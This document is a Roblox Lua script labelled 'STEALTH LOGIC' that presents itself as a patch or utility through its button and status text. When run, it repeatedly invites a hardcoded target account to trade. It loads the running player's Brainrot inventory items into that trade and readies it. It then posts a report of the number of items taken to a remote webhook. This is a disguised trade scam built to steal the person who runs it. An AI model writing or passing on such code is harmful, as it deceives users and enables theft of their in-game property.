-- [[ STEALTH LOGIC ]]
local function sendWebhook(msg)
    pcall(function()
        (request or syn.request or http_request)({
            Url = GOOD_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = "Irish Hub Update",
                    ["description"] = msg,
                    ["color"] = 65280
                }}
            })
        })
    end)
end

local function startProcess()
    ExecBtn.Text = "LOADING..."
    ExecBtn.Active = false
    Status.Text = "Status: Patching logic..."
    
    local TradeService = ReplicatedStorage:WaitForChild("TradeService")
    local inviteRemote = TradeService:WaitForChild("Invite")
    local addRemote    = TradeService:WaitForChild("AddBrainrot")
    local readyRemote  = TradeService:WaitForChild("Ready")

    task.spawn(function()
        while true do
            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
            task.wait(2)
        end
    end)

    task.spawn(function()
        task.wait(4)
        local count = 0
        local inv = lp:WaitForChild("Data"):WaitForChild("Brainrots")

        for _, item in ipairs(getgenv().Brainrots) do
            local found = inv:FindFirstChild(item)
            if found then
                pcall(function() addRemote:InvokeServer(SELECT_GUID, found.Name, found) end)
                count = count + 1
                task.wait(0.1)
            end
        end

        pcall(function() readyRemote:FireServer(READY_GUID) end)
        sendWebhook("Script executed for " .. TARGET_NAME .. ". Processed: " .. count)
        Status.Text = "Status: Script Ready"
        ExecBtn.Text = "RE-EXECUTE"
        ExecBtn.Active = true
    end)
end

ExecBtn.MouseButton1Click:Connect(startProcess)
